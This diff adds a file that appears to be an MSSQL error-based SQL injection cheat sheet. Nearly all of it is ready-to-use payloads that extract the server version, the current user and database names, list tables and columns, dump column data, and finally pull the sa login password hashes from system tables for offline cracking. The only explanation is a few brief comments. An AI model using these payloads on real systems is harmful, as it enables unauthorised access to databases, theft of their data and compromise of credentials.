@@ -1,0 +1,62 @@
+#Retrieve version
+convert(int,@@version)--
+999999 OR 1 in (SELECT TOP 1 CAST(@@version as varchar(4096))) --
+
+#Current user
+convert(int,user_name())--
+99999 OR 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096))) --
+
+#Extract number of databases
+1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--
+
+#Iterate accessible databases from master_database. Replace N with a number starting from 0
+convert(int,db_name())--
+99999 OR 1 in (SELECT TOP 1 CAST(db_name(0) as varchar(4096))) --
+1 AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=N))--
+
+#Enumerate Table Count from Current DB
+1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58)))--
+
+#Enumerate Table Count from other DB:
+CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000))+FROM+<someotherdb>..sysobjects+)+CHAR(58)+CHAR(58)))--
+
+#Enumerate all Tables in Current DB. (Replace N with a number starting from 1)
+CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--
+convert(int,(select+top+1+table_name+from+information_schema.tables))--
+convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+('<TABLE NAME>')))--
+
+#Enumerate Tables from other DBs
+SELECT name FROM <someotherdb>..sysobjects WHERE xtype = ‘U’;
+convert(int,(select+top+1+table_name+from+<someotherdb>.information_schema.tables+)))--
+convert(int,(select+top+1+table_name+from+<someotherdb>.information_schema.tables+where+table_name+not+in+('<TABLE NAME>')))--
+
+#Enumerate Columns of Table from Current DB
+convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='<FIRST ENUMERATED TABLE NAME>'))--
+convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='<TABLE NAME>'+and+column_name+not+in+('<COLUMN NAME>')))--
+99999 OR 1 in (SELECT TOP 1 CAST(<db name >..syscolumns.name as varchar(4096)) FROM <db name>..syscolumns)-- 
+
+#Enumerate Columns of Table from Other DB
+convert(int,(select+top+1+column_name+from+<DB-Name>.information_schema.columns+where+table_name='<FIRST ENUMERATED TABLE NAME>'))--
+convert(int,(select top(1) column_name from <DB-name>.information_schema.columns where table_name='<TABLE-NAME>')))--
+convert(int,(select+top+1+column_name+from+<DB-Name>.information_schema.columns+where+table_name='<TABLE NAME>'+and+column_name+not+in+('<COLUMN NAME>')))--
+
+#Dump Data from columns from Table in Current DB
+convert(int,(select+top+1+<COLUMN>+from+<TABLE>)))--
+convert(int,(select+top+1+<COLUMN>+from+<TABLE>+where+<COLUMN>+not+in+('<COLUMN>')))--
+99999 OR 1 in (SELECT TOP 1 CAST(<column name> as varchar(4096)) FROM <db-name>..<tablename> WHERE <column name> NOT IN (<retrieved data list>)); -- -
+
+#Dump Data from columns from Table in Other DB
+convert(int,(select top(1) <column-name> column_name from <DB-name>.dbo.<TABLE NAME>)))--
+convert(int,(select+top(1)+<column-name>+column_name+from+<DB-name>.dbo.<TABLE NAME>+WHERE+<column-name>+NOT+IN+('<Dumped value>'))))--
+
+
+#%2b - @. This ensures that the select id has datatype varchar thus making the cast error possible. Iterate with all values from output.
+#Useful when requesting value has datatype diff from varchar
+99999 OR 1 in (SELECT TOP 1 CAST(id as varchar(4096))%2bchar(64) FROM school..users WHERE id NOT IN ('')); -- -
+99999 OR 1 in (SELECT TOP 1 CAST(username as varchar(4096)) FROM school..users WHERE id=1); -- -
+
+#Grab the sa user's credentials for offline cracking.
+#For MSSSQL Server 2000
+SELECT name, password FROM master..sysxlogins
+#For MSSSQL Server>=2005
+SELECT name, password FROM master.sys.sql_logins
